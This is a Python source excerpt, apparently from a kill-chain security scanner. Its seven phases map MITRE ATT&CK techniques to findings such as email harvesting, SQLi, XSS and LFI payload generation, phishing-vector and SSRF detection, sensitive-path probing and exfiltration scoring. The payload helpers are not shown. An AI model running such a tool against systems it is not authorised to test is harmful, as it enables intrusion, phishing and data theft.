+   820→                data={"records": dns_records[:50]},
+   821→            ))
+   822→
+   823→        # --- WHOIS Lookup ---
+   824→        whois_data = self._whois_lookup()
+   825→        if whois_data:
+   826→            findings.append(_make_finding(
+   827→                title="WHOIS Information",
+   828→                description=f"WHOIS data available with {len(whois_data)} fields",
+   829→                risk_score=2.5,
+   830→                technique="T1590 — Gather Victim Org Information",
+   831→                data=whois_data,
+   832→            ))
+   833→
+   834→        # --- Email Harvesting ---
+   835→        emails = _extract_emails(self._body_text)
+   836→        if emails:
+   837→            findings.append(_make_finding(
+   838→                title="Email Addresses Discovered",
+   839→                description=f"Found {len(emails)} email addresses in page content",
+   840→                risk_score=4.0,
+   841→                technique="T1589 — Gather Victim Identity Information",
+   842→                data={"emails": emails[:30]},
+   843→            ))
+   844→
+   845→        # --- Certificate Transparency / Subdomain Extraction ---
+   846→        cert_subdomains = self._extract_subdomains_from_page()
+   847→        if cert_subdomains:
+   848→            findings.append(_make_finding(
+   849→                title="Subdomains Discovered",
+   850→                description=f"Found {len(cert_subdomains)} subdomains/references",
+   851→                risk_score=3.0,
+   852→                technique="T1596 — Search Open Websites/Domains",
+   853→                data={"subdomains": cert_subdomains[:40]},
+   854→            ))
+   855→
+   856→        # --- ASN Lookup ---
+   857→        asn_info = self._asn_lookup()
+   858→        if asn_info:
+   859→            findings.append(_make_finding(
+   860→                title="ASN Information",
+   861→                description=f"Network: {asn_info.get('asn', 'N/A')} ({asn_info.get('org', 'Unknown')})",
+   862→                risk_score=2.0,
+   863→                technique="T1591 — Gather Victim Org Info: Ownership",
+   864→                data=asn_info,
+   865→            ))
+   866→
+   867→        # --- Technology detection ---
+   868→        detected_tech = self._detect_technologies()
+   869→        if detected_tech:
+   870→            findings.append(_make_finding(
+   871→                title="Technology Stack Detected",
+   872→                description=f"Detected: {', '.join(detected_tech)}",
+   873→                risk_score=3.0,
+   874→                technique="T1592 — Gather Victim Host Information",
+   875→                data={"technologies": detected_tech},
+   876→            ))
+   877→
+   878→        phase.findings = findings
+   879→        phase.risk_score = round(max((f["risk_score"] for f in findings), default=0.0), 2)
+   880→        phase.risk_level = _classify_score(phase.risk_score)
+   881→        phase.duration_sec = round(time.time() - t0, 3)
+   882→        return phase
+   883→
+   884→    # =======================================================================
+   885→    # PHASE 2 — WEAPONIZATION
+   886→    # =======================================================================
+   887→
+   888→    def _phase_weaponization(self) -> KillChainPhase:
+   889→        """Phase 2: Payload generation intelligence.
+   890→
+   891→        Identifies the target's tech stack, maps CMS/framework to known
+   892→        exploit patterns, generates targeted payload suggestions (SQLi,
+   893→        XSS, LFI, RFI), and calculates an exploitability score.
+   894→        """
+   895→        phase = KillChainPhase(
+   896→            phase="weaponization",
+   897→            label=PHASE_LABELS["weaponization"],
+   898→            mitre_techniques=list(MITRE_WEAPONIZE),
+   899→            timestamp=time.time(),
+   900→        )
+   901→        t0 = time.time()
+   902→        findings: List[Dict[str, Any]] = []
+   903→
+   904→        detected = self._detect_technologies()
+   905→        all_payloads: Dict[str, List[str]] = {}
+   906→        exploitability_scores: Dict[str, float] = {}
+   907→        total_exploitability = 0.0
+   908→        tech_count = 0
+   909→
+   910→        for tech_name, tech_info in TECH_SIGNATURES.items():
+   911→            if tech_name in detected:
+   912→                tech_count += 1
+   913→                base_score = tech_info.get("exploitability_base", 5.0)
+   914→                exploit_payloads = tech_info.get("exploits", {})
+   915→
+   916→                # Verify headers match
+   917→                header_match = False
+   918→                for sig in tech_info.get("headers", []):
+   919→                    sig_lower = sig.lower()
+   920→                    for hdr_key, hdr_val in self._headers.items():
+   921→                        if sig_lower in (hdr_key + ": " + hdr_val).lower() or sig_lower in hdr_val.lower():
+   922→                            header_match = True
+   923→                            break
+   924→                    if header_match:
+   925→                        break
+   926→
+   927→                # Verify body match
+   928→                body_match = False
+   929→                for pattern in tech_info.get("cve_patterns", []):
+   930→                    if re.search(pattern, self._body_text, re.IGNORECASE):
+   931→                        body_match = True
+   932→                        break
+   933→
+   934→                confidence = 0.0
+   935→                if header_match:
+   936→                    confidence += 0.6
+   937→                if body_match:
+   938→                    confidence += 0.4
+   939→
+   940→                adjusted_score = round(base_score * confidence, 2) if confidence > 0 else round(base_score * 0.3, 2)
+   941→                exploitability_scores[tech_name] = adjusted_score
+   942→                total_exploitability = max(total_exploitability, adjusted_score)
+   943→
+   944→                # Collect payloads
+   945→                for vuln_type, payloads in exploit_payloads.items():
+   946→                    if vuln_type not in all_payloads:
+   947→                        all_payloads[vuln_type] = []
+   948→                    all_payloads[vuln_type].extend(payloads)
+   949→
+   950→                findings.append(_make_finding(
+   951→                    title=f"{tech_name.capitalize()} Exploit Patterns",
+   952→                    description=(
+   953→                        f"Detected {tech_name} with confidence {confidence:.0%}. "
+   954→                        f"Exploitability score: {adjusted_score}/10. "
+   955→                        f"Vulnerability types: {', '.join(exploit_payloads.keys())}"
+   956→                    ),
+   957→                    risk_score=adjusted_score,
+   958→                    technique="T1588 — Obtain Capabilities",
+   959→                    data={
+   960→                        "technology": tech_name,
+   961→                        "confidence": confidence,
+   962→                        "exploitability": adjusted_score,
+   963→                        "header_match": header_match,
+   964→                        "body_match": body_match,
+   965→                        "vuln_types": list(exploit_payloads.keys()),
+   966→                    },
+   967→                ))
+   968→
+   969→        # Generate SQL injection payloads
+   970→        sqli_payloads = self._generate_sqli_payloads()
+   971→        if sqli_payloads:
+   972→            all_payloads["sql_injection"] = sqli_payloads
+   973→            findings.append(_make_finding(
+   974→                title="SQL Injection Payloads Generated",
+   975→                description=f"Generated {len(sqli_payloads)} SQLi payloads for target",
+   976→                risk_score=8.0,
+   977→                technique="T1608 — Stage Capabilities",
+   978→                data={"payloads": sqli_payloads[:10]},
+   979→            ))
+   980→
+   981→        # Generate XSS payloads
+   982→        xss_payloads = self._generate_xss_payloads()
+   983→        if xss_payloads:
+   984→            all_payloads["xss"] = xss_payloads
+   985→            findings.append(_make_finding(
+   986→                title="XSS Payloads Generated",
+   987→                description=f"Generated {len(xss_payloads)} XSS payloads for target",
+   988→                risk_score=7.5,
+   989→                technique="T1608 — Stage Capabilities",
+   990→                data={"payloads": xss_payloads[:10]},
+   991→            ))
+   992→
+   993→        # Generate LFI payloads
+   994→        lfi_payloads = self._generate_lfi_payloads()
+   995→        if lfi_payloads:
+   996→            all_payloads["lfi"] = lfi_payloads
+   997→            findings.append(_make_finding(
+   998→                title="LFI Payloads Generated",
+   999→                description=f"Generated {len(lfi_payloads)} LFI payloads for target",
+  1000→                risk_score=7.0,
+  1001→                technique="T1608 — Stage Capabilities",
+  1002→                data={"payloads": lfi_payloads[:10]},
+  1003→            ))
+  1004→
+  1005→        # Calculate composite exploitability
+  1006→        composite_exploitability = total_exploitability if total_exploitability > 0 else 3.0
+  1007→        if tech_count > 1:
+  1008→            composite_exploitability = min(composite_exploitability + 1.5, 10.0)
+  1009→
+  1010→        findings.append(_make_finding(
+  1011→            title="Composite Exploitability Score",
+  1012→            description=(
+  1013→                f"Combined exploitability: {composite_exploitability:.1f}/10 "
+  1014→                f"based on {tech_count} detected technology component(s)"
+  1015→            ),
+  1016→            risk_score=composite_exploitability,
+  1017→            technique="T1641 — Build Malicious Infrastructure",
+  1018→            data={
+  1019→                "composite_score": composite_exploitability,
+  1020→                "technologies_assessed": tech_count,
+  1021→                "exploitability_by_tech": exploitability_scores,
+  1022→                "total_payload_types": len(all_payloads),
+  1023→                "total_payloads": sum(len(v) for v in all_payloads.values()),
+  1024→            },
+  1025→        ))
+  1026→
+  1027→        phase.findings = findings
+  1028→        phase.risk_score = round(max((f["risk_score"] for f in findings), default=0.0), 2)
+  1029→        phase.risk_level = _classify_score(phase.risk_score)
+  1030→        phase.duration_sec = round(time.time() - t0, 3)
+  1031→        return phase
+  1032→
+  1033→    # =======================================================================
+  1034→    # PHASE 3 — DELIVERY
+  1035→    # =======================================================================
+  1036→
+  1037→    def _phase_delivery(self) -> KillChainPhase:
+  1038→        """Phase 3: Delivery vector analysis.
+  1039→
+  1040→        Identifies email infrastructure (MX/SPF/DMARC), checks for open
+  1041→        relay indicators, analyses upload endpoints, checks file upload
+  1042→        restrictions, identifies phishing vectors (newsletter/signup forms),
+  1043→        and checks for SSRF-able endpoints.
+  1044→        """
+  1045→        phase = KillChainPhase(
+  1046→            phase="delivery",
+  1047→            label=PHASE_LABELS["delivery"],
+  1048→            mitre_techniques=list(MITRE_DELIVER),
+  1049→            timestamp=time.time(),
+  1050→        )
+  1051→        t0 = time.time()
+  1052→        findings: List[Dict[str, Any]] = []
+  1053→
+  1054→        # --- Email Infrastructure Analysis ---
+  1055→        mx_records = self._check_mx_records()
+  1056→        if mx_records:
+  1057→            findings.append(_make_finding(
+  1058→                title="MX Records Found",
+  1059→                description=f"Mail servers: {', '.join(mx_records[:5])}",
+  1060→                risk_score=3.0,
+  1061→                technique="T1566 — Phishing",
+  1062→                data={"mx_records": mx_records},
+  1063→            ))
+  1064→
+  1065→        spf_record = self._check_spf()
+  1066→        if spf_record:
+  1067→            is_strong = "all" in spf_record or "fail" in spf_record.lower()
+  1068→            findings.append(_make_finding(
+  1069→                title="SPF Record",
+  1070→                description=f"SPF record: {spf_record[:200]}",
+  1071→                risk_score=2.0 if is_strong else 6.0,
+  1072→                technique="T1566 — Phishing",
+  1073→                data={"spf": spf_record, "is_strong": is_strong},
+  1074→            ))
+  1075→        else:
+  1076→            findings.append(_make_finding(
+  1077→                title="No SPF Record",
+  1078→                description="No SPF record found — domain is vulnerable to email spoofing",
+  1079→                risk_score=7.0,
+  1080→                technique="T1566 — Phishing",
+  1081→            ))
+  1082→
+  1083→        dmarc_record = self._check_dmarc()
+  1084→        if dmarc_record:
+  1085→            has_reject = "p=reject" in dmarc_record or "p=quarantine" in dmarc_record
+  1086→            findings.append(_make_finding(
+  1087→                title="DMARC Record",
+  1088→                description=f"DMARC policy: {dmarc_record[:200]}",
+  1089→                risk_score=2.0 if has_reject else 5.0,
+  1090→                technique="T1566 — Phishing",
+  1091→                data={"dmarc": dmarc_record, "rejects_unauthorized": has_reject},
+  1092→            ))
+  1093→        else:
+  1094→            findings.append(_make_finding(
+  1095→                title="No DMARC Record",
+  1096→                description="No DMARC record — domain susceptible to spoofing-based phishing",
+  1097→                risk_score=7.5,
+  1098→                technique="T1566 — Phishing",
+  1099→            ))
+  1100→
+  1101→        # --- Upload Endpoint Analysis ---
+  1102→        upload_endpoints = self._find_upload_endpoints()
+  1103→        if upload_endpoints:
+  1104→            findings.append(_make_finding(
+  1105→                title="Upload Endpoints Discovered",
+  1106→                description=f"Found {len(upload_endpoints)} potential upload endpoints",
+  1107→                risk_score=7.0,
+  1108→                technique="T1566.001 — Spearphishing Attachment",
+  1109→                data={"endpoints": upload_endpoints},
+  1110→            ))
+  1111→
+  1112→        # --- File Upload Restrictions Check ---
+  1113→        upload_restrictions = self._check_upload_restrictions()
+  1114→        if upload_restrictions:
+  1115→            findings.append(_make_finding(
+  1116→                title="Upload Restriction Analysis",
+  1117→                description=f"Analysed upload restrictions: {len(upload_restrictions)} indicators",
+  1118→                risk_score=upload_restrictions.get("risk", 5.0),
+  1119→                technique="T1566.001 — Spearphishing Attachment",
+  1120→                data=upload_restrictions,
+  1121→            ))
+  1122→
+  1123→        # --- Phishing Vector Detection (forms) ---
+  1124→        phishing_forms = self._detect_phishing_vectors()
+  1125→        if phishing_forms:
+  1126→            findings.append(_make_finding(
+  1127→                title="Potential Phishing Vectors",
+  1128→                description=f"Found {len(phishing_forms)} forms usable for phishing campaigns",
+  1129→                risk_score=6.5,
+  1130→                technique="T1566.002 — Spearphishing Link",
+  1131→                data={"forms": phishing_forms[:10]},
+  1132→            ))
+  1133→
+  1134→        # --- SSRF-able Endpoint Detection ---
+  1135→        ssrf_endpoints = self._detect_ssrf_endpoints()
+  1136→        if ssrf_endpoints:
+  1137→            findings.append(_make_finding(
+  1138→                title="SSRF-Susceptible Endpoints",
+  1139→                description=f"Found {len(ssrf_endpoints)} endpoints potentially vulnerable to SSRF",
+  1140→                risk_score=8.5,
+  1141→                technique="T1190 — Exploit Public-Facing Application",
+  1142→                data={"endpoints": ssrf_endpoints},
+  1143→            ))
+  1144→
+  1145→        # --- Open Relay Check ---
+  1146→        relay_check = self._check_open_relay()
+  1147→        if relay_check:
+  1148→            findings.append(_make_finding(
+  1149→                title="Email Relay Assessment",
+  1150→                description=relay_check.get("description", "Email relay check performed"),
+  1151→                risk_score=relay_check.get("risk_score", 2.0),
+  1152→                technique="T1566 — Phishing",
+  1153→                data=relay_check,
+  1154→            ))
+  1155→
+  1156→        phase.findings = findings
+  1157→        phase.risk_score = round(max((f["risk_score"] for f in findings), default=0.0), 2)
+  1158→        phase.risk_level = _classify_score(phase.risk_score)
+  1159→        phase.duration_sec = round(time.time() - t0, 3)
+  1160→        return phase
+  1161→
+  1162→    # =======================================================================
+  1163→    # PHASE 4 — EXPLOITATION
+  1164→    # =======================================================================
+  1165→
+  1166→    def _phase_exploitation(self) -> KillChainPhase:
+  1167→        """Phase 4: Exploitation feasibility scoring.
+  1168→
+  1169→        Combines findings from phases 1–3 into an exploit feasibility
+  1170→        matrix, identifies attack paths, ranks vulnerabilities by
+  1171→        exploitability, and generates an initial attack tree.
+  1172→        """
+  1173→        phase = KillChainPhase(
+  1174→            phase="exploitation",
+  1175→            label=PHASE_LABELS["exploitation"],
+  1176→            mitre_techniques=list(MITRE_EXPLOIT),
+  1177→            timestamp=time.time(),
+  1178→        )
+  1179→        t0 = time.time()
+  1180→        findings: List[Dict[str, Any]] = []
+  1181→
+  1182→        # Gather all findings from previous phases
+  1183→        all_prev_findings: List[Dict[str, Any]] = []
+  1184→        for prev_phase_id in ["reconnaissance", "weaponization", "delivery"]:
+  1185→            prev = self._phases.get(prev_phase_id)
+  1186→            if prev:
+  1187→                all_prev_findings.extend(prev.findings)
+  1188→
+  1189→        # --- Vulnerability Ranking ---
+  1190→        ranked_vulns = sorted(all_prev_findings, key=lambda f: f.get("risk_score", 0), reverse=True)
+  1191→        top_vulns = ranked_vulns[:10]
+  1192→        if top_vulns:
+  1193→            findings.append(_make_finding(
+  1194→                title="Top Vulnerability Rankings",
+  1195→                description=f"Ranked {len(top_vulns)} vulnerabilities by exploitability",
+  1196→                risk_score=top_vulns[0].get("risk_score", 0),
+  1197→                technique="T1190 — Exploit Public-Facing Application",
+  1198→                data={"ranked": [
+  1199→                    {"title": v["title"], "score": v.get("risk_score", 0)} for v in top_vulns
+  1200→                ]},
+  1201→            ))
+  1202→
+  1203→        # --- Exploit Feasibility Matrix ---
+  1204→        feasibility = self._compute_exploit_feasibility(all_prev_findings)
+  1205→        findings.append(_make_finding(
+  1206→            title="Exploit Feasibility Matrix",
+  1207→            description=(
+  1208→                f"Network exposure: {feasibility['network_exposure']:.1f}/10, "
+  1209→                f"Tech exploitability: {feasibility['tech_exploitability']:.1f}/10, "
+  1210→                f"Delivery viability: {feasibility['delivery_viability']:.1f}/10"
+  1211→            ),
+  1212→            risk_score=feasibility["composite"],
+  1213→            technique="T1210 — Exploitation of Remote Services",
+  1214→            data=feasibility,
+  1215→        ))
+  1216→
+  1217→        # --- Attack Path Identification ---
+  1218→        attack_paths = self._identify_attack_paths(all_prev_findings)
+  1219→        for path in attack_paths:
+  1220→            findings.append(_make_finding(
+  1221→                title=path.description,
+  1222→                description=(
+  1223→                    f"Path: {' → '.join(path.phases)} | "
+  1224→                    f"Feasibility: {path.feasibility_score:.1f}/10 | "
+  1225→                    f"Impact: {path.impact}"
+  1226→                ),
+  1227→                risk_score=path.feasibility_score,
+  1228→                technique=", ".join(path.techniques[:2]) if path.techniques else "T1190",
+  1229→                data=path.to_dict(),
+  1230→            ))
+  1231→
+  1232→        # --- Remote Service Exploitation Check ---
+  1233→        open_ports_indicators = self._detect_remote_service_indicators()
+  1234→        if open_ports_indicators:
+  1235→            findings.append(_make_finding(
+  1236→                title="Remote Service Indicators",
+  1237→                description=f"Found {len(open_ports_indicators)} remote service indicators",
+  1238→                risk_score=7.0,
+  1239→                technique="T1210 — Exploitation of Remote Services",
+  1240→                data={"indicators": open_ports_indicators},
+  1241→            ))
+  1242→
+  1243→        # --- Public-Facing Application Exploit Check ---
+  1244→        pf_apps = self._detect_public_facing_apps()
+  1245→        if pf_apps:
+  1246→            findings.append(_make_finding(
+  1247→                title="Public-Facing Application Endpoints",
+  1248→                description=f"Discovered {len(pf_apps)} public-facing application endpoints",
+  1249→                risk_score=7.5,
+  1250→                technique="T1190 — Exploit Public-Facing Application",
+  1251→                data={"applications": pf_apps},
+  1252→            ))
+  1253→
+  1254→        phase.findings = findings
+  1255→        phase.risk_score = round(max((f["risk_score"] for f in findings), default=0.0), 2)
+  1256→        phase.risk_level = _classify_score(phase.risk_score)
+  1257→        phase.duration_sec = round(time.time() - t0, 3)
+  1258→        return phase
+  1259→
+  1260→    # =======================================================================
+  1261→    # PHASE 5 — INSTALLATION
+  1262→    # =======================================================================
+  1263→
+  1264→    def _phase_installation(self) -> KillChainPhase:
+  1265→        """Phase 5: Persistence mechanism detection.
+  1266→
+  1267→        Checks for writeable paths, backup file discovery, configuration
+  1268→        file exposure, cron job detection, startup script exposure,
+  1269→        and database dump accessibility.
+  1270→        """
+  1271→        phase = KillChainPhase(
+  1272→            phase="installation",
+  1273→            label=PHASE_LABELS["installation"],
+  1274→            mitre_techniques=list(MITRE_INSTALL),
+  1275→            timestamp=time.time(),
+  1276→        )
+  1277→        t0 = time.time()
+  1278→        findings: List[Dict[str, Any]] = []
+  1279→
+  1280→        # --- Sensitive Path Probing ---
+  1281→        exposed_paths = self._probe_sensitive_paths()
+  1282→        if exposed_paths:
+  1283→            findings.append(_make_finding(
+  1284→                title="Exposed Sensitive Paths",
+  1285→                description=f"Found {len(exposed_paths)} accessible sensitive paths/files",
+  1286→                risk_score=8.5,
+  1287→                technique="T1543 — Create/Modify System Process",
+  1288→                data={"paths": exposed_paths[:20]},
+  1289→            ))
+  1290→
+  1291→        # --- Backup File Discovery ---
+  1292→        backups = self._discover_backup_files()
+  1293→        if backups:
+  1294→            findings.append(_make_finding(
+  1295→                title="Backup Files Discovered",
+  1296→                description=f"Found {len(backups)} accessible backup files",
+  1297→                risk_score=9.0,
+  1298→                technique="T1560 — Archive Collected Data",
+  1299→                data={"backups": backups[:20]},
+  1300→            ))
+  1301→
+  1302→        # --- Configuration File Exposure ---
+  1303→        config_files = self._discover_config_files()
+  1304→        if config_files:
+  1305→            findings.append(_make_finding(
+  1306→                title="Configuration Files Exposed",
+  1307→                description=f"Found {len(config_files)} exposed configuration files",
+  1308→                risk_score=8.0,
+  1309→                technique="T1543 — Create/Modify System Process",
+  1310→                data={"configs": config_files[:20]},
+  1311→            ))
+  1312→
+  1313→        # --- Writeable Path Detection ---
+  1314→        writeable = self._detect_writeable_indicators()
+  1315→        if writeable:
+  1316→            findings.append(_make_finding(
+  1317→                title="Writeable Path Indicators",
+  1318→                description=f"Found {len(writeable)} indicators of writeable paths",
+  1319→                risk_score=7.5,
+  1320→                technique="T1053 — Scheduled Task/Job",
+  1321→                data={"indicators": writeable},
+  1322→            ))
+  1323→
+  1324→        # --- Cron/Job Detection ---
+  1325→        cron_indicators = self._detect_cron_indicators()
+  1326→        if cron_indicators:
+  1327→            findings.append(_make_finding(
+  1328→                title="Cron/Scheduled Job Indicators",
+  1329→                description=f"Found {len(cron_indicators)} cron/scheduled job indicators",
+  1330→                risk_score=7.0,
+  1331→                technique="T1053 — Scheduled Task/Job",
+  1332→                data={"indicators": cron_indicators},
+  1333→            ))
+  1334→
+  1335→        # --- Startup Script Exposure ---
+  1336→        startup_scripts = self._detect_startup_exposure()
+  1337→        if startup_scripts:
+  1338→            findings.append(_make_finding(
+  1339→                title="Startup Script Exposure",
+  1340→                description=f"Found {len(startup_scripts)} startup script exposure indicators",
+  1341→                risk_score=7.5,
+  1342→                technique="T1547 — Boot or Logon Autostart",
+  1343→                data={"scripts": startup_scripts},
+  1344→            ))
+  1345→
+  1346→        # --- Database Dump Accessibility ---
+  1347→        db_dumps = self._detect_database_dumps()
+  1348→        if db_dumps:
+  1349→            findings.append(_make_finding(
+  1350→                title="Database Dump Accessibility",
+  1351→                description=f"Found {len(db_dumps)} potential database dump indicators",
+  1352→                risk_score=9.5,
+  1353→                technique="T1070 — Indicator Removal",
+  1354→                data={"dumps": db_dumps},
+  1355→            ))
+  1356→
+  1357→        # --- Persistence Opportunities ---
+  1358→        persistence = self._assess_persistence_opportunities()
+  1359→        if persistence:
+  1360→            findings.append(_make_finding(
+  1361→                title="Persistence Opportunities",
+  1362→                description=f"Identified {len(persistence)} persistence mechanism opportunities",
+  1363→                risk_score=persistence.get("risk_score", 5.0),
+  1364→                technique="T1574 — Hijack Execution Flow",
+  1365→                data=persistence,
+  1366→            ))
+  1367→
+  1368→        phase.findings = findings
+  1369→        phase.risk_score = round(max((f["risk_score"] for f in findings), default=0.0), 2)
+  1370→        phase.risk_level = _classify_score(phase.risk_score)
+  1371→        phase.duration_sec = round(time.time() - t0, 3)
+  1372→        return phase
+  1373→
+  1374→    # =======================================================================
+  1375→    # PHASE 6 — COMMAND & CONTROL
+  1376→    # =======================================================================
+  1377→
+  1378→    def _phase_command_and_control(self) -> KillChainPhase:
+  1379→        """Phase 6: C2 infrastructure analysis.
+  1380→
+  1381→        Checks for common C2 URI patterns, botnet signatures, DNS C2-style
+  1382→        patterns, reverse shell indicators, and WebSocket availability
+  1383→        for bidirectional control channels.
+  1384→        """
+  1385→        phase = KillChainPhase(
+  1386→            phase="command_and_control",
+  1387→            label=PHASE_LABELS["command_and_control"],
+  1388→            mitre_techniques=list(MITRE_C2),
+  1389→            timestamp=time.time(),
+  1390→        )
+  1391→        t0 = time.time()
+  1392→        findings: List[Dict[str, Any]] = []
+  1393→
+  1394→        # --- C2 URI Pattern Detection ---
+  1395→        c2_paths = self._detect_c2_paths()
+  1396→        if c2_paths:
+  1397→            findings.append(_make_finding(
+  1398→                title="C2 URI Patterns Detected",
+  1399→                description=f"Found {len(c2_paths)} endpoints matching C2 naming patterns",
+  1400→                risk_score=8.0,
+  1401→                technique="T1071 — Application Layer Protocol",
+  1402→                data={"paths": c2_paths},
+  1403→            ))
+  1404→
+  1405→        # --- Botnet Signature Detection ---
+  1406→        botnet_sigs = self._detect_botnet_signatures()
+  1407→        if botnet_sigs:
+  1408→            findings.append(_make_finding(
+  1409→                title="Botnet Signature Indicators",
+  1410→                description=f"Found {len(botnet_sigs)} potential botnet-related patterns",
+  1411→                risk_score=8.5,
+  1412→                technique="T1090 — Proxy",
+  1413→                data={"signatures": botnet_sigs},
+  1414→            ))
+  1415→
+  1416→        # --- DNS C2-Style Pattern Analysis ---
+  1417→        dns_c2 = self._analyze_dns_c2_patterns()
+  1418→        if dns_c2:
+  1419→            findings.append(_make_finding(
+  1420→                title="DNS C2-Style Patterns",
+  1421→                description=f"DNS analysis revealed {len(dns_c2)} C2-style indicators",
+  1422→                risk_score=7.5,
+  1423→                technique="T1572 — Protocol Tunneling",
+  1424→                data={"patterns": dns_c2},
+  1425→            ))
+  1426→
+  1427→        # --- Reverse Shell Indicators ---
+  1428→        reverse_shell = self._detect_reverse_shell_indicators()
+  1429→        if reverse_shell:
+  1430→            findings.append(_make_finding(
+  1431→                title="Reverse Shell Indicators",
+  1432→                description=f"Found {len(reverse_shell)} indicators of reverse shell capability",
+  1433→                risk_score=9.0,
+  1434→                technique="T1571 — Non-Standard Port",
+  1435→                data={"indicators": reverse_shell},
+  1436→            ))
+  1437→
+  1438→        # --- WebSocket Availability ---
+  1439→        ws_endpoints = self._detect_websocket_endpoints()
+  1440→        if ws_endpoints:
+  1441→            findings.append(_make_finding(
+  1442→                title="WebSocket Endpoints",
+  1443→                description=f"Found {len(ws_endpoints)} WebSocket endpoints for bidirectional control",
+  1444→                risk_score=6.0,
+  1445→                technique="T1095 — Non-Application Layer Protocol",
+  1446→                data={"endpoints": ws_endpoints},
+  1447→            ))
+  1448→
+  1449→        # --- Encrypted Channel Potential ---
+  1450→        encrypted = self._analyze_encrypted_channel_potential()
+  1451→        if encrypted:
+  1452→            findings.append(_make_finding(
+  1453→                title="Encrypted Channel Potential",
+  1454→                description=encrypted.get("description", "Encrypted channel analysis performed"),
+  1455→                risk_score=encrypted.get("risk_score", 3.0),
+  1456→                technique="T1573 — Encrypted Channel",
+  1457→                data=encrypted,
+  1458→            ))
+  1459→
+  1460→        # --- Proxy/Ingress Indicators ---
+  1461→        proxy_indicators = self._detect_proxy_indicators()
+  1462→        if proxy_indicators:
+  1463→            findings.append(_make_finding(
+  1464→                title="Proxy/Ingress Transfer Indicators",
+  1465→                description=f"Found {len(proxy_indicators)} proxy/ingress transfer indicators",
+  1466→                risk_score=6.5,
+  1467→                technique="T1105 — Ingress Tool Transfer",
+  1468→                data={"indicators": proxy_indicators},
+  1469→            ))
+  1470→
+  1471→        phase.findings = findings
+  1472→        phase.risk_score = round(max((f["risk_score"] for f in findings), default=0.0), 2)
+  1473→        phase.risk_level = _classify_score(phase.risk_score)
+  1474→        phase.duration_sec = round(time.time() - t0, 3)
+  1475→        return phase
+  1476→
+  1477→    # =======================================================================
+  1478→    # PHASE 7 — ACTIONS ON OBJECTIVES
+  1479→    # =======================================================================
+  1480→
+  1481→    def _phase_actions_on_objectives(self) -> KillChainPhase:
+  1482→        """Phase 7: Impact assessment.
+  1483→
+  1484→        Performs data exfiltration risk scoring, lateral movement potential
+  1485→        analysis, privilege escalation path identification, business impact
+  1486→        calculation, and data classification inference.
+  1487→        """
+  1488→        phase = KillChainPhase(
+  1489→            phase="actions_on_objectives",
+  1490→            label=PHASE_LABELS["actions_on_objectives"],
+  1491→            mitre_techniques=list(MITRE_ACTION),
+  1492→            timestamp=time.time(),
+  1493→        )
+  1494→        t0 = time.time()
+  1495→        findings: List[Dict[str, Any]] = []
+  1496→
+  1497→        # --- Data Exfiltration Risk Scoring ---
+  1498→        exfil_risk = self._score_exfiltration_risk()
+  1499→        findings.append(_make_finding(
+  1500→            title="Data Exfiltration Risk",
+  1501→            description=(
+  1502→                f"Exfiltration risk score: {exfil_risk['overall']:.1f}/10. "
+  1503→                f"Network vectors: {exfil_risk['network_vectors']}, "
+  1504→                f"Application vectors: {exfil_risk['app_vectors']}"
+  1505→            ),
+  1506→            risk_score=exfil_risk["overall"],
+  1507→            technique="T1041 — Exfiltration Over C2 Channel",
+  1508→            data=exfil_risk,
+  1509→        ))
+  1510→
+  1511→        # --- Lateral Movement Potential ---
+  1512→        lateral = self._assess_lateral_movement()
+  1513→        findings.append(_make_finding(
+  1514→            title="Lateral Movement Potential",
+  1515→            description=(
+  1516→                f"Lateral movement score: {lateral['score']:.1f}/10. "
+  1517→                f"Internal paths: {lateral['internal_paths']}, "
+  1518→                f"Service connections: {lateral['service_connections']}"
+  1519→            ),
+  1520→            risk_score=lateral["score"],
+  1521→            technique="T1021 — Remote Services",
+  1522→            data=lateral,
+  1523→        ))
+  1524→
+  1525→        # --- Privilege Escalation Paths ---
+  1526→        privesc = self._identify_privesc_paths()
+  1527→        if privesc:
+  1528→            findings.append(_make_finding(
+  1529→                title="Privilege Escalation Paths",
+  1530→                description=f"Identified {len(privesc)} potential privilege escalation vectors",
+  1531→                risk_score=privesc[0].get("risk_score", 5.0) if privesc else 3.0,
+  1532→                technique="T1078 — Valid Accounts",
+  1533→                data={"paths": privesc[:10]},
+  1534→            ))
+  1535→
+  1536→        # --- Business Impact Calculation ---
+  1537→        business_impact = self._calculate_business_impact()
+  1538→        findings.append(_make_finding(
+  1539→            title="Business Impact Assessment",
+  1540→            description=(
+  1541→                f"Financial impact: {business_impact['financial']}, "
+  1542→                f"Reputational: {business_impact['reputational']}, "
+  1543→                f"Operational: {business_impact['operational']}, "
+  1544→                f"Compliance: {business_impact['compliance']}"
+  1545→            ),
+  1546→            risk_score=business_impact["overall_score"],
+  1547→            technique="T1486 — Data Encrypted for Impact",
+  1548→            data=business_impact,
+  1549→        ))
+  1550→
+  1551→        # --- Data Classification Inference ---
+  1552→        data_class = self._infer_data_classification()
+  1553→        findings.append(_make_finding(
+  1554→            title="Data Classification Inference",
+  1555→            description=(
+  1556→                f"Sensitivity level: {data_class['sensitivity_level']}. "
+  1557→                f"Data types detected: {', '.join(data_class['data_types'])}"
+  1558→            ),
+  1559→            risk_score=data_class["risk_score"],
+  1560→            technique="T1560 — Archive Collected Data",
+  1561→            data=data_class,
+  1562→        ))
+  1563→
+  1564→        # --- DoS Impact Assessment ---
+  1565→        dos_assessment = self._assess_dos_impact()
+  1566→        findings.append(_make_finding(
+  1567→            title="Denial of Service Impact",
+  1568→            description=(
+  1569→                f"DoS impact: {dos_assessment['impact_level']}. "
+  1570→                f"Vectors: {', '.join(dos_assessment['vectors'])}"
+  1571→            ),
+  1572→            risk_score=dos_assessment["risk_score"],
+  1573→            technique="T1498 — Network Denial of Service",
+  1574→            data=dos_assessment,
+  1575→        ))
+  1576→
+  1577→        # --- Alternate Exfiltration Protocol Analysis ---
+  1578→        alt_exfil = self._analyze_alternate_exfiltration()
+  1579→        if alt_exfil:
+  1580→            findings.append(_make_finding(
+  1581→                title="Alternate Exfiltration Protocols",
+  1582→                description=f"Identified {len(alt_exfil)} alternate exfiltration protocol opportunities",
+  1583→                risk_score=7.0,
+  1584→                technique="T1048 — Exfiltration Over Alternate Protocol",
+  1585→                data={"protocols": alt_exfil},
+  1586→            ))
+  1587→
+  1588→        phase.findings = findings
+  1589→        phase.risk_score = round(max((f["risk_score"] for f in findings), default=0.0), 2)
+  1590→        phase.risk_level = _classify_score(phase.risk_score)
+  1591→        phase.duration_sec = round(time.time() - t0, 3)
+  1592→        return phase
+  1593→
+  1594→    # -----------------------------------------------------------------------
+  1595→    # Helper methods — Reconnaissance
